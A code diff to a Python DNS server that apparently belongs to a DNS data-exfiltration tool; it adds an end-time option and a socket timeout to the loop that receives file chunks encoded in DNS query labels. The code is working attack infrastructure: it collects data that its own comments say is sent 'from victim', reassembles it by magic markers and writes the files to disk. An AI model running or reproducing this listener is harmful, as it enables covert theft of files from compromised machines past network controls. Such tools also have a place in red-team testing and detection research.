@@ -12,11 +12,20 @@ import socket
 import sys
 import time
 import zlib
+from datetime import datetime
 from typing import Optional
 
 import structlog
 
 VERSION = "2.0"
+
+TIME_FORMATS = [
+    "%Y-%m-%dT%H:%M:%S.%fZ",
+    "%Y-%m-%dT%H:%M:%S",
+    "%Y-%m-%dT%H:%M",
+    "%Y-%m-%dT%H",
+    "%Y-%m-%d",
+]
 
 DNS_QUESTION_INDEX = 12
 
@@ -369,6 +378,11 @@ Advanced:\n"""
         action="store_false",
         help="Do use color log for console",
     )
+    parser.add_argument(
+        "--endtime",
+        type=str,
+        help="Optional server stop time as ISO datetime",
+    )
     parser.add_argument("ip", type=str, help="The IP address to bind to")
     parser.set_defaults(
         v=False,
@@ -378,6 +392,7 @@ Advanced:\n"""
         f=17,
         color=True,
         force_ip=False,
+        endtime=None,
     )
 
     args = parser.parse_args()
@@ -389,6 +404,19 @@ Advanced:\n"""
     ip = args.ip
     domain = args.domain
     log_level = logging.DEBUG if args.v else logging.INFO
+
+    endtime = None
+    if args.endtime is not None:
+        for fmt in TIME_FORMATS:
+            try:
+                endtime = datetime.strptime(args.endtime, fmt)
+                break
+            except ValueError:
+                pass
+        if endtime is None:
+            parser.print_help()
+            logger.error("Unable to parse endtime format", endtime=args.endtime)
+            exit(1)
 
     configure_logging(
         level=log_level,
@@ -421,6 +449,7 @@ Advanced:\n"""
     print(banner())
 
     udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp.settimeout(10)
 
     try:
         udp.bind((ip, 53))
@@ -428,81 +457,92 @@ Advanced:\n"""
         logger.exception("Cannot bind to address", ip=ip, port=53)
         exit(1)
 
-    logger.info("DNS server listening", ip=ip, port=53)
+    logger.info(
+        "DNS server listening",
+        ip=ip,
+        port=53,
+        endtime=endtime.timestamp() if endtime is not None else None,
+    )
     p_cmds(s, b, ip, z, domain, args.force_ip)
     logger.info("Once files have sent, use Ctrl+C to exit and save.")
 
     r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
     try:
-        while 1:
+        # run for ever or until endtime
+        while endtime is None or datetime.now() < endtime:
             # There is a bottle neck in this function, if very slow PC, will take
             # slightly longer to send as this main loop recieves the data from victim.
+            try:
+                data, addr = udp.recvfrom(1024)
+                p = DNSQuery(data)
+                udp.sendto(p.request(ip), addr)
 
-            data, addr = udp.recvfrom(1024)
-            p = DNSQuery(data)
-            udp.sendto(p.request(ip), addr)
+                req_split = p.data_text.split(b".")
+                req_split.pop()  # fix trailing dot... cba to fix this
 
-            req_split = p.data_text.split(b".")
-            req_split.pop()  # fix trailing dot... cba to fix this
+                dlen = len(req_split)
+                fname = b""
+                tmp_data = []
 
-            dlen = len(req_split)
-            fname = b""
-            tmp_data = []
+                for n in range(0, dlen):
+                    if chr(req_split[n][len(req_split[n]) - 1]) == "-":
+                        tmp_data.append(req_split[n])
+                    else:
+                        # Filename
+                        fname += req_split[n] + b"."
 
-            for n in range(0, dlen):
-                if chr(req_split[n][len(req_split[n]) - 1]) == "-":
-                    tmp_data.append(req_split[n])
-                else:
-                    # Filename
-                    fname += req_split[n] + b"."
+                fname = fname[:-1]
 
-            fname = fname[:-1]
+                # remove domain part when using auth DNS
+                if domain is not None:
+                    fname = fname.replace(b"." + domain.encode("utf-8"), b"")
 
-            # remove domain part when using auth DNS
-            if domain is not None:
-                fname = fname.replace(b"." + domain.encode("utf-8"), b"")
+                if fname not in r_data:
+                    r_data[fname] = {}
 
-            if fname not in r_data:
-                r_data[fname] = {}
-
-            if len(tmp_data) < 2:
-                logger.debug(
-                    "Skipping packet since it does have less than 2 payloads",
-                    packet=req_split,
-                    data=tmp_data,
-                )
-                continue
-
-            magic_nr = tmp_data[0]
-            if magic_nr == b"3x6-":
-                try:
-                    index = int(tmp_data[1].rstrip(b"-"))
-                except ValueError as err:
-                    # This should usually not happen
+                if len(tmp_data) < 2:
                     logger.debug(
-                        "Skipping packet since its index was not a number",
+                        "Skipping packet since it does have less than 2 payloads",
+                        packet=req_split,
+                        data=tmp_data,
+                    )
+                    continue
+
+                magic_nr = tmp_data[0]
+                if magic_nr == b"3x6-":
+                    try:
+                        index = int(tmp_data[1].rstrip(b"-"))
+                    except ValueError as err:
+                        # This should usually not happen
+                        logger.debug(
+                            "Skipping packet since its index was not a number",
+                            packet=req_split,
+                        )
+                        continue
+
+                    logger.info(
+                        "Received data", data_length=len(p.data_text), file=fname
+                    )
+                    logger.debug(
+                        "Received data text on server", data=p.data_text, ip=ip, port=53
+                    )
+
+                    r_data[fname][index] = tmp_data[
+                        2:
+                    ]  # first 2 packets are not payload
+                elif magic_nr == b"3x7-":
+                    logger.info("Received file end marker", file=fname)
+                    save_file(fname, r_data[fname], z)
+                    del r_data[fname]
+                else:
+                    logger.debug(
+                        "Skipping packet since it does not have magic nr 3x6",
                         packet=req_split,
                     )
                     continue
 
-                logger.info("Received data", data_length=len(p.data_text), file=fname)
-                logger.debug(
-                    "Received data text on server", data=p.data_text, ip=ip, port=53
-                )
-
-                r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
-            elif magic_nr == b"3x7-":
-                logger.info("Received file end marker", file=fname)
-                save_file(fname, r_data[fname], z)
-                del r_data[fname]
-            else:
-                logger.debug(
-                    "Skipping packet since it does not have magic nr 3x6",
-                    packet=req_split,
-                )
-                continue
-
-            # print r_data
+            except socket.timeout:
+                pass
 
     except KeyboardInterrupt:
         logger.info("Received Ctrl+C stopping")
@@ -513,5 +553,10 @@ Advanced:\n"""
         for fname, value in r_data:
             save_file(fname, value, z)
 
-    logger.info("DNS server stop listening", ip=ip, port=53)
+    logger.info(
+        "DNS server stop listening",
+        ip=ip,
+        port=53,
+        endtime=endtime.timestamp() if endtime is not None else None,
+    )
     udp.close()
